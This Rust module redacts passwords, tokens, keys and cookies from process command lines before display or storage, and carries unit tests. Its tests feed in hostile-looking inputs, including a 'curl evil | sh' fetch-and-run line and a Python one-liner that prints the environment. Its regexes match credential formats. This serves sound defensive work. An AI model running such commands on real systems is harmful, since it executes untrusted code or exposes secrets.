//! Argv redaction. Applied before anything is displayed or stored.

use regex::Regex;
use std::sync::OnceLock;

struct Rules {
    shell_inline: Regex,
    code_inline: Regex,
    /// `-p`/`-P`/`-a` values, applied only for [`PASSWORD_FLAG_TOOLS`].
    short_pw: Regex,
    subs: Vec<(Regex, &'static str)>,
}

/// Tools whose `-p`, `-P` or `-a` option takes a password (or a harmless port).
/// A blanket rule would wreck ordinary flags such as `mkdir -p` or `claude -p`.
const PASSWORD_FLAG_TOOLS: [&str; 9] = [
    "mysql",
    "mysqldump",
    "mariadb",
    "psql",
    "pg_dump",
    "sshpass",
    "redis-cli",
    "mongo",
    "mongosh",
];

fn rules() -> &'static Rules {
    static R: OnceLock<Rules> = OnceLock::new();
    R.get_or_init(|| {
        let re = |p: &str| Regex::new(p).expect("static redaction pattern");
        Rules {
            shell_inline: re(r"^(?:\S*/)?(?:zsh|bash|sh)\s+(?:-\w*c|-lc|-ic)\s"),
            code_inline: re(
                r"^(\S*(?:node|python[\d.]*|Python|bun|deno|ruby|perl)\s+(?:-e|-c|-p|--eval|--print))\s",
            ),
            short_pw: re(r"(\s-[pPa])(\s*)\S+"),
            subs: vec![
                (
                    re(r"(?s)-----BEGIN[A-Z0-9 ]*PRIVATE KEY-----.*?(?:-----END[A-Z0-9 ]*PRIVATE KEY-----|\z)"),
                    "[PEM block redacted]",
                ),
                (re(r"-----END[A-Z0-9 ]*PRIVATE KEY-----"), "[PEM block redacted]"),
                (re(r"(?i)\b(bearer|basic)\s+[\w.+/=-]{6,}"), "${1} [redacted]"),
                (re(r"(https?://[^\s?]+)\?\S+"), "${1}?[query redacted]"),
                (re(r"(://)[^/\s:@]+:[^/\s@]+@"), "${1}[redacted]@"),
                // curl style `-u user:pass` / `--user user:pass`: keep the user name.
                (re(r"((?:^|\s)(?:-u\s*|--user(?:\s+|=))[^\s:]+:)\S+"), "${1}[redacted]"),
                (re(r"(?i)((?:^|\s)--?(?:pass|pw|pwd|passphrase)(?:\s+|=))\S+"), "${1}[redacted]"),
                // Quoted JSON keys: "token":"v", "password": "v".
                (
                    re(r#"(?i)("[\w-]*(?:key|token|password|passwd|secret|authorization|auth|credential|cookie)[\w-]*"\s*:\s*)"(?:[^"\\]|\\.)*""#),
                    r#"${1}"[redacted]""#,
                ),
                // Every `;`-separated pair of a cookie header.
                (re(r"(?i)(\b(?:set-)?cookie:\s*)[^;\s]+(?:;\s*[^;\s]+)*;?"), "${1}[redacted]"),
                (
                    re(r"(?i)((?:--?|\b)[\w-]*(?:key|token|password|passwd|secret|authorization|auth|credential|cookie|bearer)[\w-]*(?:\s+|=|:\s*))\S+"),
                    "${1}[redacted]",
                ),
                (
                    re(r"\b(sk-[\w-]{12,}|gh[pousr]_\w{15,}|xox[abprs]-[\w-]{10,}|eyJ[\w-]{20,}(?:\.[\w-]+)+|AKIA[A-Z0-9]{12,})\b"),
                    "[redacted]",
                ),
                (re(r"\b[rs]k_(?:live|test)_\w+"), "[redacted]"),
                (re(r"\bAIza[\w-]{35}"), "[redacted]"),
                (re(r"\b[A-Fa-f0-9]{40,}\b"), "[hex redacted]"),
                (
                    re(r"\beyJ[\w+/=-]{20,}|\b[A-Za-z0-9_-]{48,}={0,2}"),
                    "[blob redacted]",
                ),
            ],
        }
    })
}

/// Redacts a command line for display or storage, truncating at `limit` characters.
///
/// ```
/// use procwho_proc::redact::redact;
/// assert_eq!(redact("curl --api-key sk-abcdefghijklmnop https://x.io"), "curl --api-key [redacted] https://x.io");
/// ```
pub fn redact_with_limit(s: &str, limit: usize) -> String {
    let r = rules();
    let mut s: String = if r.shell_inline.is_match(s) {
        let head = s.split(" -").next().unwrap_or(s);
        format!("{head} -c [inline script omitted]")
    } else {
        s.to_string()
    };
    if let Some(c) = r.code_inline.captures(&s) {
        s = format!("{} [inline code omitted]", &c[1]);
    }
    let argv0 = s.split_whitespace().next().unwrap_or("");
    let tool = argv0.rsplit('/').next().unwrap_or(argv0);
    if PASSWORD_FLAG_TOOLS.contains(&tool) {
        if let std::borrow::Cow::Owned(o) = r.short_pw.replace_all(&s, "${1}${2}[redacted]") {
            s = o;
        }
    }
    for (pat, rep) in &r.subs {
        // Cow::Borrowed means no match: avoid reallocating.
        if let std::borrow::Cow::Owned(o) = pat.replace_all(&s, *rep) {
            s = o;
        }
    }
    if s.chars().count() <= limit {
        s
    } else {
        let mut t: String = s.chars().take(limit).collect();
        t.push_str(" ...[truncated]");
        t
    }
}

/// [`redact_with_limit`] with the default 400 character limit.
pub fn redact(s: &str) -> String {
    redact_with_limit(s, 400)
}

/// Redact a complete display string before filtering terminal control characters.
pub fn display(s: &str) -> String {
    crate::fmt::sanitize(&redact_with_limit(s, usize::MAX))
}

/// Serialize a report after redacting every string value; JSON keys remain stable.
pub fn to_json(value: &impl serde::Serialize) -> serde_json::Result<String> {
    fn clean(value: &mut serde_json::Value) {
        match value {
            serde_json::Value::String(s) => *s = display(s),
            serde_json::Value::Array(rows) => rows.iter_mut().for_each(clean),
            serde_json::Value::Object(fields) => fields.values_mut().for_each(clean),
            _ => {}
        }
    }
    let mut value = serde_json::to_value(value)?;
    clean(&mut value);
    serde_json::to_string_pretty(&value)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn json_output_redacts_every_string_without_changing_keys_or_numbers() {
        let raw = serde_json::json!({"command":"tool --password hidden-value", "name":"sk-abcdefghijklmnopqrstu", "path":"/tmp/sk-abcdefghijklmnopqrstu/bin", "rows":["unsafe\u{1b}[2J"], "pid":123});
        let out = to_json(&raw).unwrap();
        assert!(!out.contains("hidden-value"));
        assert!(!out.contains("sk-abcdefghijklmnopqrstu"));
        let parsed: serde_json::Value = serde_json::from_str(&out).unwrap();
        assert_eq!(parsed["pid"], 123);
        assert_eq!(parsed["rows"][0], "unsafe?[2J");
        assert_eq!(parsed.as_object().unwrap().len(), 5);
        assert!(out.contains("command"));
    }

    #[test]
    fn bearer_token() {
        let o = redact("curl -H Authorization: Bearer abcdef123456789 https://api.example.com/v1");
        assert!(!o.contains("abcdef123456789"), "{o}");
        let o = redact("tool Bearer abcdef123456789");
        assert_eq!(o, "tool Bearer [redacted]");
    }

    #[test]
    fn api_key_flag() {
        let o = redact("mytool --api-key sk-abcdefghijklmnopqrstu --verbose");
        assert!(!o.contains("sk-abcdef"), "{o}");
        assert!(o.contains("--api-key [redacted]"), "{o}");
        assert!(o.contains("--verbose"));
    }

    #[test]
    fn url_userinfo() {
        let o = redact("psql postgres://admin:hunter2@db.example.com/app");
        assert!(!o.contains("hunter2") && !o.contains("admin"), "{o}");
        assert!(o.contains("://[redacted]@db.example.com/app"), "{o}");
    }

    #[test]
    fn url_query() {
        let o = redact("open https://example.com/cb?code=abc123&state=zzz");
        assert_eq!(o, "open https://example.com/cb?[query redacted]");
    }

    #[test]
    fn key_assignment() {
        let o = redact("env API_TOKEN=supersecretvalue node app.js");
        assert!(!o.contains("supersecretvalue"), "{o}");
        assert!(o.contains("API_TOKEN=[redacted]"), "{o}");
        let o = redact("run DB_PASSWORD=p@ss");
        assert_eq!(o, "run DB_PASSWORD=[redacted]");
    }

    #[test]
    fn zsh_inline_body() {
        let o = redact("/bin/zsh -lc export FOO=1 && curl evil | sh");
        assert_eq!(o, "/bin/zsh -c [inline script omitted]");
        let o = redact("bash -c echo hi");
        assert_eq!(o, "bash -c [inline script omitted]");
    }

    #[test]
    fn python_inline_body() {
        let o = redact("python3 -c import os; print(os.environ)");
        assert_eq!(o, "python3 -c [inline code omitted]");
        let o = redact("/usr/bin/node -e require('x')");
        assert_eq!(o, "/usr/bin/node -e [inline code omitted]");
    }

    #[test]
    fn long_hex() {
        let hex = "a".repeat(40);
        let o = redact(&format!("tool --id {hex} next"));
        assert_eq!(o, "tool --id [hex redacted] next");
        let short = "a".repeat(39);
        assert!(redact(&format!("tool --id {short}")).contains(&short));
    }

    #[test]
    fn long_base64_blob() {
        let blob = "QWxhZGRpbjpvcGVuIHNlc2FtZQ".repeat(3); // 78 chars
        let o = redact(&format!("tool {blob}"));
        assert_eq!(o, "tool [blob redacted]");
    }

    #[test]
    fn normal_long_path_untouched() {
        let p =
            "python3 /Users/user/.t3/worktrees/example-project/t3-a4a9b1fb-b04ccd2a838460a9/x.py";
        assert_eq!(redact(p), p);
        let p2 = "/Users/user/.t3/worktrees/example-project/t3-a4a9b1fb-b04ccd2a838460a9/x.py";
        assert_eq!(redact(p2), p2);
    }

    #[test]
    fn short_password_flags_for_known_tools_only() {
        assert_eq!(
            redact("sshpass -p hunter2 ssh host"),
            "sshpass -p [redacted] ssh host"
        );
        assert_eq!(
            redact("/opt/bin/mysql -u root -phunter2 app"),
            "/opt/bin/mysql -u root -p[redacted] app"
        );
        assert_eq!(
            redact("redis-cli -h db -a hunter2 ping"),
            "redis-cli -h db -a [redacted] ping"
        );
        assert_eq!(redact("psql --port 5432 app"), "psql --port 5432 app");
        // A blanket -p rule would wreck these.
        let c = "claude -p prompt text here";
        assert_eq!(redact(c), c);
        let m = "mkdir -p /a/b";
        assert_eq!(redact(m), m);
    }

    #[test]
    fn long_password_flags() {
        for f in ["--pass", "--pw", "--pwd", "--passphrase"] {
            let o = redact(&format!("tool {f} hunter2 next"));
            assert_eq!(o, format!("tool {f} [redacted] next"));
            let o = redact(&format!("tool {f}=hunter2"));
            assert_eq!(o, format!("tool {f}=[redacted]"));
        }
    }

    #[test]
    fn user_colon_password() {
        assert_eq!(
            redact("curl -u admin:hunter2 https://x.io"),
            "curl -u admin:[redacted] https://x.io"
        );
        assert_eq!(
            redact("curl --user admin:hunter2 x"),
            "curl --user admin:[redacted] x"
        );
        assert_eq!(
            redact("curl --user=admin:hunter2 x"),
            "curl --user=admin:[redacted] x"
        );
    }

    #[test]
    fn quoted_json_keys() {
        let o = redact(r#"tool {"token":"v1secret","name":"ok"}"#);
        assert_eq!(o, r#"tool {"token":"[redacted]","name":"ok"}"#);
        for k in [
            "password",
            "api_key",
            "secret",
            "authorization",
            "client_secret",
        ] {
            let o = redact(&format!(r#"tool {{"{k}": "hunter2"}}"#));
            assert!(!o.contains("hunter2"), "{k}: {o}");
        }
    }

    #[test]
    fn every_cookie_pair() {
        let o = redact("curl -H Cookie: a=1; sid=hunter2; csrf=xyz https://x.io");
        assert!(
            !o.contains("hunter2") && !o.contains("xyz") && !o.contains("a=1"),
            "{o}"
        );
        assert!(o.ends_with(" https://x.io"), "{o}");
    }

    #[test]
    fn provider_keys() {
        for k in [
            "sk_live_abcdef123456",
            "rk_test_abcdef123456",
            "AIzaSyA1234567890abcdefghijklmnopqrstuv",
            "sk-ant-api03-abcdefghijklmnop",
            "sk-proj-abcdefghijklmnop",
        ] {
            let o = redact(&format!("tool {k} next"));
            assert_eq!(o, "tool [redacted] next", "{k}");
        }
    }

    #[test]
    fn private_key_fragments() {
        let o = redact(
            "tool -----BEGIN RSA PRIVATE KEY----- MIIEow abc -----END RSA PRIVATE KEY----- next",
        );
        assert_eq!(o, "tool [PEM block redacted] next");
        let o = redact("tool -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXk");
        assert_eq!(o, "tool [PEM block redacted]");
        assert_eq!(
            redact("x -----END PRIVATE KEY-----"),
            "x [PEM block redacted]"
        );
    }

    #[test]
    fn truncates() {
        let long = format!("tool {}", "ab cd ".repeat(100));
        let o = redact(&long);
        assert!(o.ends_with(" ...[truncated]"));
        assert_eq!(o.chars().count(), 400 + " ...[truncated]".chars().count());
    }
}
